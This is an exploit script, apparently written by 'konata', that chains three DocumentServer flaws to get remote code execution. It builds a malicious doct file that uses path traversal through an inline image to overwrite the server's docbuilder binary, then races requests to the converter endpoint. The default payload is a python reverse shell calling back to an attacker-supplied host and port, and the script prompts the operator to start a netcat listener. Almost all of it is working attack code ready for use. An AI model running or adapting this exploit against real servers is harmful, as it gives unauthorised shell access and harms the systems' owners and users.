'''
RCE exploit for DocumentServer chaining 3 vulns by konata
'''


import sys
import argparse
import requests
import os
import multiprocessing
import random
import json

from base64 import b64encode

from time import sleep

from pwn import *
from subprocess import Popen


WCHAR_SIZE = 4

g_nodeAttributeEnd = 0xFB


bash_reverse_shell ='''
#!/bin/bash
export RHOST="{}";export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
'''


class Utils:
    '''
    Utils class
    '''
    
    @staticmethod
    def create_file(filename, data):
        with open(filename, 'wb') as f:
            f.write(data)
        return filename


class XMLSerializer:
    '''
    Helper class for local debugging.
    It builds xml file with serialized inputs
    as fileFrom and fileTo. It's the way DocumentServer
    builds its params.xml
    '''
    
    def __init__(self):
        pass
    
    def encode_xml(self, value):
        new_value = value
        new_value = new_value.replace('<', '&lt;')
        new_value = new_value.replace('<', '&lt;')
        new_value = new_value.replace('>', '&gt;')
        new_value = new_value.replace('&', '&amp;')
        new_value = new_value.replace('\'', '&apos;')
        new_value = new_value.replace('"', '&quot;')
        new_value = new_value.replace('\r', '&#xD;')
        new_value = new_value.replace('\n', '&#xA;')
        new_value = new_value.replace('\t', '&#x9;')
        new_value = new_value.replace('\xA0', '&#A0;')
        
        return new_value

    def serialize_mail_merge(self, value):
        return ''

    def serialize_thumbnail(self, value):
        return ''

    def serialize_xml_prop(self, name, value):
        xml = ''
        if value is not None:
            xml += '<{}>{}</{}>'.format(name, self.encode_xml(str(value)), name)
        else:
            xml += '<{} xsi:nil="true" />'.format(name)
        
        return xml

    def build_config_file(
        self,
        filename,
        m_oMailMergeSend=None,
        m_oThumbnail=None,
        m_oInputLimits=None,
        m_sKey=None,
        m_sFileFrom=None,
        m_sFileTo=None,
        m_nFormatFrom=None,
        m_nFormatTo=None,
        m_nCsvTxtEncoding=None,
        m_nCsvDelimiter=None,
        m_nCsvDelimiterChar=None,
        m_nLcid=None,
        m_bPaid=None,
        m_bFromChanges=None,
        m_sAllFontsPath=None,
        m_sFontDir=None,
        m_sThemeDir=None,
        m_bDontSaveAdditional=None,
        m_sJsonParams=None,
        m_sPassword=None,
        m_sSavePassword=None,
        m_sDocumentID=None,
        m_sTempDir=None,
        m_bEmbeddedFonts=None,
        m_oTimestamp=None,
        m_bIsNoBase64=None,
        m_bIsPDFA=None,
    ):
        '''
        This function needs its own class so freaking much
        Maybe I will add it in the near future
        '''

        xml = ''
        xml += '<?xml version="1.0" encoding="utf-8"?>'
        xml += '<TaskQueueDataConvert xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
        xml += ' xmlns:xsd="http://www.w3.org/2001/XMLSchema">'
        xml += self.serialize_xml_prop('m_sKey', m_sKey)
        xml += self.serialize_xml_prop('m_sFileFrom', m_sFileFrom)
        xml += self.serialize_xml_prop('m_sFileTo', m_sFileTo)
        xml += self.serialize_xml_prop('m_nFormatTo', m_nFormatTo)
        xml += self.serialize_xml_prop('m_bIsPDFA', m_bIsPDFA)
        xml += self.serialize_xml_prop('m_nCsvTxtEncoding', m_nCsvTxtEncoding)
        xml += self.serialize_xml_prop('m_nCsvDelimiter', m_nCsvDelimiter)
        xml += self.serialize_xml_prop('m_nCsvDelimiterChar', m_nCsvDelimiterChar)
        xml += self.serialize_xml_prop('m_bPaid', m_bPaid)
        xml += self.serialize_xml_prop('m_bEmbeddedFonts', m_bEmbeddedFonts)
        xml += self.serialize_xml_prop('m_bFromChanges', m_bFromChanges)
        xml += self.serialize_xml_prop('m_sFontDir', m_sFontDir)
        xml += self.serialize_xml_prop('m_sThemeDir', m_sThemeDir)
        
        if m_oMailMergeSend is not None:
            xml += self.serialize_mail_merge(m_oMailMergeSend)
        
        if m_oThumbnail is not None:
            xml += self.serialize_thumbnail(m_oThumbnail)

        xml += self.serialize_xml_prop('m_sJsonParams', m_sJsonParams)
        xml += self.serialize_xml_prop('m_nLcid', m_nLcid)
        xml += self.serialize_xml_prop('m_oTimestamp', m_oTimestamp)
        xml += self.serialize_xml_prop('m_bIsNoBase64', m_bIsNoBase64)

        xml += '</TaskQueueDataConvert>'
        
        with open(filename, 'w') as f:
            f.write(xml)

        return filename, xml


class BinaryWriter:
    '''
    Binary Writer stream. Used for building binary
    data like doct files for docx convertion
    '''
    
    def __init__(self):
        self.stream = b''

    def write_u8(self, u8):
        self.stream += p8(u8)

    def write_u16(self, u16):
        self.stream += p16(u16)

    def write_u32(self, u32):
        self.stream += p32(u32)

    def write_u64(self, u64):
        self.stream += p64(u64)

    def write_str(self, data):
        self.stream += p32(len(data))
        self.stream += data.encode('utf-16')

    def get_stream(self):
        return self.stream


class BinaryWriterRev:
    '''
    Reverse Binary Writer stream. It's handy when building
    binary format like doct files for docx convertion
    '''
    
    def __init__(self):
        self.stream = b''

    def write_u8(self, u8):
        self.stream = p8(u8) + self.stream

    def write_u16(self, u16):
        self.stream = p16(u16) + self.stream

    def write_u32(self, u32):
        self.stream = p32(u32) + self.stream

    def write_u64(self, u64):
        self.stream = p64(u64) + self.stream

    def write_str(self, data):
        # log.info('data len @ ' + hex(len(data)))
        self.stream = data.encode('utf-16')[2:] + self.stream
        self.stream = p32(len(data)) + self.stream

    def get_stream(self):
        return self.stream

    def get_stream_size(self):
        return len(self.stream)
    

class DocxBuilder:
    '''
    Core class for building doct binary with malicious
    docx format data. It will inject target_filename and
    target_data for file overwriting using unsafe inline
    image handling and 2 other vulns related to incorrect
    string manipulation
    '''
    
    def __init__(self):
        self.binw  = BinaryWriter()
        self.binwr = BinaryWriterRev()

    def build_malicious_file(
        self, filename, target_filename, target_data,
        iters=1, suffix='\x00display1pimage/1'
    ):
        data = 'data:image/{};base64,{}'.format(target_filename+suffix, b64encode(target_data.encode()).decode())
        log.info('constructed malicious image format')
        log.info('  data --> {}'.format(data))

        log.info('preparing the malicious doct file...')
        # +++ PPTX::Logic::UniFill::fromPPTY +++
        # Here we prepare our data for the race
        for _ in range(iters):
            self.binwr.write_u8(0)              # end attribute
            self.binwr.write_str(data)          # malicious data
            self.binwr.write_u32(0x11223344)    # len
            self.binwr.write_u16(0xddaa)        # start attributes + type
            self.binwr.write_u8(3)              # _t (type)

        self.binwr.write_u8(0xFB)           # _at (nodeAttributeEnd)
        self.binwr.write_u8(0)              # skip value
        
        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # _e2 size

        self.binwr.write_u8(0)              # rec

        self.binwr.write_u8(0xFB)           # _at (nodeAttributeEnd)
        self.binwr.write_u8(0)              # skip value

        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # _e size
        self.binwr.write_u8(1)              # FILL_TYPE_BLIP

        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # read_end

        # +++ PPTX::nsTheme::FmtScheme::fromPPTY +++
        self.binwr.write_u8(0)              # skip value
        self.binwr.write_u32(1)             # _c (unifill count)
        self.binwr.write_u32(0)             # skip value
        self.binwr.write_u8(0)              # _at (attribute 0 type)

        self.binwr.write_u8(0xFB)           # _at (nodeAttributeEnd)
        self.binwr.write_u8(0)              # skip value
        
        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # _end_rec

        # +++ PPTX::nsTheme::ThemeElements::fromPPTY +++
        self.binwr.write_u8(2)              # _at (attribute 2 type)
        
        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # _end_rec

        # +++ PPTX::Theme::fromPPTY +++
        self.binwr.write_u8(0)              # _at (attribute 0 type)
        self.binwr.write_u8(0xFB)           # _at (nodeAttributeEnd)
        self.binwr.write_u8(0)              # skip value

        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # _end_rec
        self.binwr.write_u8(0)              # type (useless)
    
        # +++ BinDocxRW::Binary_OtherTableReader::ReadOtherContent +++
        self.binwr.write_u32(0xddaaddaa)    # length
        self.binwr.write_u8(3)              # type (c_oSerOtherTableTypes::DocxTheme)
        
        pos = self.binwr.get_stream_size()
        self.binwr.write_u32(pos)           # stLen

        # +++ BinDocxRW::BinaryFileReader::ReadMainTable +++
        self.binwr.write_u32(6)             # mtiOffBits
        self.binwr.write_u8(7)              # c_oSerTableTypes::Other
        self.binwr.write_u8(1)              # mtLen (we need only one record parsing)

        data_stream = self.binwr.get_stream()
        data_stream_b64 = b64encode(data_stream)
        data = 'DOCY1234;{};{}'.format(
            len(data_stream_b64),
            data_stream_b64.decode()
        )

        return Utils.create_file(filename, data.encode())


class ArgParser:
    '''
    Argument Parser class
    '''
    
    def __init__(self):
        self.parse_args()

    def parse_args(self):
        self.parser = argparse.ArgumentParser(description='')
        self.parser.add_argument('-hs', '--http-server', type=str,
            help='Evil HTTP server IP address (current machine)')
        self.parser.add_argument('-hp', '--http-port', type=int,
            help='Evil HTTP server port (current machine)')
        self.parser.add_argument('-gf', '--generate-file',
            action='store_true', help='Generate an evil doct file')
        self.parser.add_argument('-dt', '--doct', type=str,
            default='pwn.doct', help='Path to an evil doct file')
        self.parser.add_argument('-t', '--target', type=str,
            default='123/../../../../../../../../proc/self/cwd/bin/docbuilder',
            help='Path to a target file')
        self.parser.add_argument('-df', '--data-file', type=str,
            default='', help='Data file that will be written into the target file')
        self.parser.add_argument('-ri', '--rev-ip', type=str,
            help='Reverse shell server IP address')
        self.parser.add_argument('-rp', '--rev-port', type=int,
            help='Reverse shell server port')
        self.parser.add_argument('-dsi', '--ds-ip', type=str,
            help='DocumentServer IP address')
        self.parser.add_argument('-dsp', '--ds-port', type=int,
            help='DocumentServer port')

        args = self.parser.parse_args()
        
        self.http_server = args.http_server
        self.http_port   = args.http_port
        self.doct        = args.doct
        self.data_file   = args.data_file
        self.target      = args.target
        self.rev_ip      = args.rev_ip
        self.rev_port    = args.rev_port
        self.ds_ip       = args.ds_ip
        self.ds_port     = args.ds_port
        self.generate_file = args.generate_file


class DSCommunicator:
    '''
    Wrapper class for communication between local machine
    and the target DocumentServer server. Basically, it 
    just wraps requests.post
    '''
    
    def __init__(self, ds_ip, ds_port, http_server, http_port, http_file, ready):
        self.ds_ip       = ds_ip
        self.ds_port     = ds_port
        self.http_server = http_server
        self.http_port   = http_port
        self.http_file   = http_file

        self.ready = ready

    def x2t_request(self, outputtype, filetype, key):
        req_url  = 'http://{}:{}/converter'.format(self.ds_ip, self.ds_port)
        http_url = 'http://{}:{}/{}'.format(
            self.http_server,
            self.http_port,
            self.http_file
        )

        log.info('converter --> {}'.format(http_url))
        resp = requests.post(
            req_url,
            json={
                'outputtype': outputtype,
                'filetype': filetype,
                'url': http_url,
                'key': key,
                'async': 'true'
            },
            timeout=3
        ).text
        log.info('converter <-- {}'.format(resp))
        return resp

    def savefile(self, docId, filename, content):
        request = json.dumps({
            'id': docId,
            'savekey': '',
            'outputpath': filename
        })
        
        req_url  = 'http://{}:{}/savefile/{}?cmd={}'.format(
            self.ds_ip,
            self.ds_port,
            docId,
            request
        )
        
        log.info('savefile --> {}'.format(req_url))
        resp = requests.post(
            req_url, data=content
        ).text
        log.info('savefile <-- {}'.format(resp))
        return resp


FORMATS = [
    'docx', 'doc',   'odt',  'rtf',  'txt',
    'html', 'mht',   'epub', 'fb2',  'mobi',
    'docm', 'dotx',  'dotm', 'fodt', 'ott',
    'doc',  'doc',   'pptx', 'ppt',  'odp',
    'ppsx', 'pptm',  'ppsm', 'potx', 'potm',
    'fodt', 'otp',   'xlsx', 'xls',  'ods',
    'csv',  'xlsm',  'xltx', 'xltm', 'fods',
    'ots',  'pdf',   'swf',  'djvu', 'xps',
    'svg',  'htmlr', 'zip',  'json', 'jpg',
    'jpg',  'tiff',  'tga',  'gif',  'png',
    'emf',  'wmf',   'bmp',  'cr2',  'pcx',
    'ras',  'psd',   'ico',  'bin',  'doct',
    'xlst', 'pptt']


def thread_trigger_x2t(parser, http_file, ready):
    '''
    Thread that will trigger x2t activity by
    sending a dumb request
    '''
    
    ds_ip       = parser.ds_ip
    ds_port     = parser.ds_port
    http_server = parser.http_server
    http_port   = parser.http_port
    
    req_url = 'http://{}:{}/converter'.format(ds_ip, ds_port)
    http_url = 'http://{}:{}/{}'.format(http_server, http_port, http_file)
    
    # Wait until target file overwriter will be
    # ready to send the malicious request
    while not ready.value:
        pass

    try:
        resp = requests.post(
            req_url,
            json={
                'url': http_url,
                'outputtype': random.choice(FORMATS),
                'filetype': random.choice(FORMATS),
            }
        )
    except Exception:
        pass


def thread_trigger_docbuilder(parser, ready):
    '''
    Thread that will trigger docbuilder activity by
    sending a dumb request
    '''

    ds_ip   = parser.ds_ip
    ds_port = parser.ds_port

    # Wait until target file overwriter will be
    # ready to send the malicious request
    while not ready.value:
        pass

    req_url = 'http://{}:{}/docbuilder'.format(ds_ip, ds_port)
    try:
        resp = requests.post(
            req_url, json={}
        )
    except (Exception, KeyboardInterrupt):
        pass


def main():
    parser = ArgParser()

    ready = multiprocessing.Value('i', 0)
    
    xml_serializer  = XMLSerializer()
    docx_builder    = DocxBuilder()
    ds_communicator = DSCommunicator(
        parser.ds_ip,
        parser.ds_port,
        parser.http_server,
        parser.http_port,
        parser.doct,
        ready
    )

    # If data_file param is empty, then we will be
    # using bash reverse shell as default value
    # that will be written into the target file on
    # the remote documentserver machine
    data = ''
    if parser.data_file == '':
        data = bash_reverse_shell.format(parser.rev_ip, parser.rev_port)
    else:
        with open(parser.data_file, 'r') as f:
            data = f.read()

    generate_file = parser.generate_file
    if generate_file:
        log.info('generate_file is True, please wait ...')
        doct_filename = docx_builder.build_malicious_file(
            parser.doct,
            parser.target,
            data
        )
        log.success('evil file was created on the local machine')

    log.info('run a local http server... (python -m SimpleHTTPServer {})'.format(parser.http_port))
    pause()
    
    log.info('run a reverse shell server... (nc -l -p {} 0.0.0.0)'.format(parser.rev_port))
    pause()

    # Prepare thread that will trigger docbuilder activity
    jobs = []
    for _ in range(1):
        j = multiprocessing.Process(
            target=thread_trigger_docbuilder,
            args=(parser, ready)
        )
        jobs.append(j)

    # Start docbuilder activity thread and wait until
    # docbuilder binary will be overwritten
    for jb in jobs:
        jb.start()

    # Send request to documentserver which will eventually
    # overwrite docbuilder binary.
    log.info('overwriting docbuilder binary on the remote machine...')
    try:
        ds_communicator.x2t_request(
            'docx',
            'doct',
            'konata_keyy'
        )
    except Exception:
        pass
    
    log.success('docbuilder was overwritten')

    # Now we're ready to start docbuilder activity
    ds_communicator.ready.value = 1
    log.info('running docbuilder activity thread...')
    log.success('reverse shell should be opened now')


if __name__ == '__main__':
    main()